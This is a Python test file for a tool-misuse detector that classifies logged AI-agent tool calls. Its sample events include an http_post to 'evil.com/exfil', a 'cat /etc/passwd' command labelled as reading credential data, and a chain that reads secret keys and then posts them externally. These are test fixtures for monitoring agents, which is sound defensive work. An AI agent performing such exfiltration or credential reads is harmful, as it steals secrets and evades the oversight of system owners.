"""Tests for tool misuse classification."""
from orbit_ir.tool_misuse import (
    analyze_tool_misuse,
    format_text,
    format_json,
    _categorize_tool,
)


def test_empty_events():
    r = analyze_tool_misuse([])
    assert r.summary.total_detections == 0
    assert r.agent_profiles == []


def test_no_misuse():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "data.txt",
         "timestamp": "2025-01-01T00:00:00Z"},
    ]
    r = analyze_tool_misuse(events)
    assert r.summary.total_detections == 0


def test_write_on_readonly():
    events = [
        {"agent_id": "a1", "tool": "write_file", "resource": "config/prod.yaml",
         "access_level": "readonly", "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    assert r.summary.total_detections == 1
    assert r.detections[0].misuse_type == "intentional"
    assert r.detections[0].severity == "high"


def test_write_on_readwrite_ok():
    events = [
        {"agent_id": "a1", "tool": "write_file", "resource": "data/output.txt",
         "access_level": "readwrite", "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    write_on_ro = [d for d in r.detections if "read-only" in d.description.lower()]
    assert len(write_on_ro) == 0


def test_unexpected_network_endpoint():
    events = [
        {"agent_id": "a1", "tool": "http_post", "resource": "https://evil.com/exfil",
         "allowed_endpoints": ["api.internal.com", "db.internal.com"],
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    net = [d for d in r.detections if d.misuse_type == "exploratory"]
    assert len(net) >= 1
    assert "evil.com" in net[0].description


def test_allowed_network_ok():
    events = [
        {"agent_id": "a1", "tool": "http_get", "resource": "https://api.internal.com/data",
         "allowed_endpoints": ["api.internal.com"],
         "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    net = [d for d in r.detections if "unexpected endpoint" in d.description.lower()]
    assert len(net) == 0


def test_system_tool_for_data():
    events = [
        {"agent_id": "a1", "tool": "execute_command", "resource": "cat /etc/passwd",
         "purpose": "read credential data", "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    evasive = [d for d in r.detections if d.misuse_type == "evasive"]
    assert len(evasive) >= 1


def test_system_tool_normal_ok():
    events = [
        {"agent_id": "a1", "tool": "execute_command", "resource": "deploy.sh",
         "purpose": "deploy service", "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    evasive = [d for d in r.detections if d.misuse_type == "evasive"]
    assert len(evasive) == 0


def test_suspicious_chain_read_to_send():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "secrets/keys",
         "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a1", "tool": "search_files", "resource": "configs/",
         "timestamp": "2025-01-01T00:02:00Z"},
        {"agent_id": "a1", "tool": "list_directory", "resource": "internal/",
         "timestamp": "2025-01-01T00:03:00Z"},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://external.com",
         "timestamp": "2025-01-01T00:04:00Z"},
    ]
    r = analyze_tool_misuse(events)
    chain = [d for d in r.detections if d.misuse_type == "intentional"]
    assert len(chain) >= 1


def test_no_chain_with_single_read():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "data.txt",
         "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a1", "tool": "http_post", "resource": "https://api.com",
         "timestamp": "2025-01-01T00:02:00Z"},
    ]
    r = analyze_tool_misuse(events)
    chain = [d for d in r.detections if "chain" in d.description.lower()]
    assert len(chain) == 0


def test_unusual_parameters():
    events = [
        {"agent_id": "a1", "tool": "query_db", "resource": "users",
         "parameters": {"table": "users", "limit": 10},
         "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a1", "tool": "query_db", "resource": "users",
         "parameters": {"table": "users", "limit": 10},
         "timestamp": "2025-01-01T00:02:00Z"},
        {"agent_id": "a1", "tool": "query_db", "resource": "users",
         "parameters": {"table": "users", "limit": 10},
         "timestamp": "2025-01-01T00:03:00Z"},
        {"agent_id": "a1", "tool": "query_db", "resource": "users",
         "parameters": {"debug": True, "raw_sql": "SELECT *", "bypass": True},
         "timestamp": "2025-01-01T00:04:00Z"},
    ]
    r = analyze_tool_misuse(events)
    unusual = [d for d in r.detections if d.misuse_type == "exploratory" and "unusual param" in d.description.lower()]
    assert len(unusual) >= 1


def test_multiple_agents():
    events = [
        {"agent_id": "a1", "tool": "write_file", "resource": "x",
         "access_level": "readonly", "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a2", "tool": "execute_command", "resource": "cat secret",
         "purpose": "read data", "timestamp": "2025-01-01T00:02:00Z"},
    ]
    r = analyze_tool_misuse(events)
    assert r.summary.agents_involved == 2


def test_agent_profiles():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "f1",
         "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a1", "tool": "read_file", "resource": "f2",
         "timestamp": "2025-01-01T00:02:00Z"},
        {"agent_id": "a1", "tool": "write_file", "resource": "f3",
         "timestamp": "2025-01-01T00:03:00Z"},
    ]
    r = analyze_tool_misuse(events)
    assert len(r.agent_profiles) >= 1
    assert r.agent_profiles[0].total_calls == 3
    assert r.agent_profiles[0].unique_tools == 2


def test_deviation_scores():
    events = [
        {"agent_id": "a1", "tool": "read_file", "resource": "f1",
         "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a2", "tool": "execute_command", "resource": "cmd",
         "timestamp": "2025-01-01T00:02:00Z"},
    ]
    r = analyze_tool_misuse(events)
    assert "a1" in r.deviation_scores or "a2" in r.deviation_scores


def test_categorize_tool():
    assert _categorize_tool("write_file") == "write"
    assert _categorize_tool("read_file") == "read"
    assert _categorize_tool("http_post") == "network"
    assert _categorize_tool("execute_command") == "system"
    assert _categorize_tool("unknown_thing") == "other"


def test_format_text_output():
    events = [
        {"agent_id": "a1", "tool": "write_file", "resource": "x",
         "access_level": "readonly", "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    text = format_text(r)
    assert "Tool Misuse" in text
    assert "MISUSE-" in text
    assert "a1" in text


def test_format_json_output():
    events = [
        {"agent_id": "a1", "tool": "write_file", "resource": "x",
         "access_level": "readonly", "timestamp": "2025-01-01T00:01:00Z"},
    ]
    r = analyze_tool_misuse(events)
    out = format_json(r)
    import json
    data = json.loads(out)
    assert "detections" in data
    assert "summary" in data
    assert data["summary"]["total_detections"] >= 1


def test_format_text_empty():
    r = analyze_tool_misuse([])
    text = format_text(r)
    assert "Tool Misuse" in text
    assert "0" in text


def test_tools_flagged_count():
    events = [
        {"agent_id": "a1", "tool": "write_file", "resource": "x",
         "access_level": "readonly", "timestamp": "2025-01-01T00:01:00Z"},
        {"agent_id": "a1", "tool": "delete_file", "resource": "y",
         "access_level": "read-only", "timestamp": "2025-01-01T00:02:00Z"},
    ]
    r = analyze_tool_misuse(events)
    assert r.summary.tools_flagged == 2
